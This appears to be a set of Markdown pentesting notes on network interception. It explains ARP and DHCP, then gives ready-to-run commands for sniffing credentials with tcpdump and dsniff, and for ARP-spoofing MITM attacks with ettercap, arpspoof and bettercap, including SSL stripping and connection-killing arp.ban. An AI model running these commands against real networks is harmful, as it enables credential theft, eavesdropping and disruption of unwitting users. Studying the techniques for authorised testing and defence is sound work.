> Intercepting traffic for sniffing or MITM attacks on a client

## Basics

| Service | Ports |
| - | - |
| `arp` | no port, as its on layer 2 |
| `DHCP` | dst: 67(udp), src: 68(udp) |

### ARP
> Adress Resolution Protocol, translation of IP to MAC addresses

If an IP packet is being sent, the client checks it's `ARP` table and if the IP is there places the linked MAC into the layer 2 dst address field in the frame. If the IP cannot be resolved an `ARP` request is sent in the LAN.

Request contains: source IP, source MAC, dst IP, dst MAC `FF:FF:FF:FF:FF:FF` (indicates broadcast msg) of the frame -> the `ARP` request itself has `00:00:00:00:00:00` as dst mac. 

`ARP` requests are triggered when:
- Comm. inside LAN (get target MAC)
- Comm. over LAN boundary (get GW MAC)
- FWD Router 2 Router
- Router delivers packet to destination host  

| `gratuitious ARP` |
| - |
| Meaning packets are sent pre-emptively from a host with his information to the broadcast address, so all paricipants get the info |

### DHCP
> Service to supply IP addresses to clients in a broadcast domain

Communication takes place in a broadcast domain, also the client initiates the communication.  

1. client: `dhcpdiscover` - requesting an IP via broadcast message
2. server: `dhcpoffer` - answer with IP and lease time, again via broadcast
3. client: `dhcprequest` - answer to the chosen server (still broadcast)
4. server: `dhcpack` - confirm the IP to the client (last broadcast)

Above messages are for IPv4

### IP forwarding

> in order to intercept the traffic without it being dropped, the packets we intercept from other clients must still be forwarded from our machine. 
> For this we can enable IP forwarding on our machine to have them intercepted and forwarded as if nothing has happened...

```bash
sudo -i
# enable ip forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
```


## Sniffing
> Bevore or shortly after an attempt for a MITM attack is made, the traffic should either be saved or sniffed in realtime.

- `wireshark` --> obviously able to store/dump/analyze the traffic at runtime or later on
- `tcpdump` 

```bash
sudo tcpdump -i <interface> -w <pcapfile>  # Intercept traffic and store in file
sudo tcpdump -i <interface> -xxAXXSs 0 dst <targetIP>  # Intercept, filter on dst address and hex+ASCII output on console
```


- `dsniff` --> does not always show everything...

```bash
dsniff -i <interface>  # intercepts traffic on interface and shows sniffed credentials and stuff
```


-> Most of the intercepting tools of MITM attacks also have the ability to sniff/analyze/display the traffic intercepted (see next section)

## MITM tools

> Utilizing `arp` or `DHCP` spoofing, these tools allow the placement of the attacker inbetween to hosts to intercept traffic and analyze it (mostly unencrypted traffic).

### ettercap

```bash
sudo ettercap -G  # start GUI mode
```

`ettercap` allows for 2 modes
- unified: sniffs on all packets on the specified interface
- bridged: sniffs on specified interface and forwards it to the 2nd one specified  

1. Scan for live hosts on the network
	- GUI: `Menu -> Hosts -> Scan for hosts`
2. Display found hosts
	- GUI: `Menu -> Hosts -> Host list`
3. Select the target host(s) and
	- GUI: `Select host -> Add to Target {1,2}` 

**Important:** As all traffic of the targets will be processed, add them sparingly

4. Start the attack
	- GUI: `Globe button -> <attackType>` 

> The two hosts which are ought to be attacked, should be placed in different target groups!

### arpspoof

> Poisons the arp table of the targeted host(s) to place the attacker interface with its MAC instead of the other conversational partner (and vice versa to have full duplex interception)

```bash
# Terminal 1
sudo arpspoof -i <interface> -t <targetIP> <targetIP2>

# Terminal 2
sudo arpspoof -i <interface> -t <targetIP2> <targetIP>
```

Both must be run, otherwise the traffice is only intercepted in one way.  

**important:** You need to have ip forwardings set (see [[Sniffing and MITM#IP forwarding]]), otherwise the intercepted traffic will end at your machine. With forwarding on you are forwarding the packets to their proper destination (while also dumping it via tcpdump or wireshark).

- Also has no capability of analyzing or saving the traffic either use `tcpdump` or `wireshark` to store intercepted traffic

### bettercap

> Powerful tool for analyzing and intercepting traffic in a WIFI environment or LAN

0. Start `bettercap` in cli mode

```bash
sudo bettercap -iface <interface>
```

1. Discover hosts in the network in order to include them in attacks/analysis

```bash
> net.recon on  # enable recon module
> net.probe on  # enable probing and wait few seconds for discovery of hosts
> net.probe off # disable probing
> net.show      # show discovered hosts
```

2. Configure and start arp spoofing

```bash
> set arp.spoof.targets <targetIP>  # or multiple (comma seperated) / iprange
> set arp.spoof.fullduplex true # spoofs also the gateway so MITM can be done
> arp.ban on    # target conectivity will no longer work (crashes connections)
> arp.spoof on  # exploit
```

3. Enable local sniffing and check intercepted traffic

```bash
> net.sniff on  # enables sniffing and display of interesting stuff in cli
> set net.sniff.output /root/mitm.pcap  # store the traffic
> help  # show currently enabled modules
```

4. Enable intercepting of https traffic via ssl stripping

```bash
> set http.proxy.sslstrip true  # enable sslstrip for https interception
> http.proxy on  # turn http proxy on
```

**INTERESTING:** You may use `arpspoof` for `arp` poisoning but have sniffing on in `bettercap` to analyze the traffic.

Also for help use either the autocompletion of the tool (`tab` is your friend) or use the `help` command:

```bash
> help arp.spoof
```

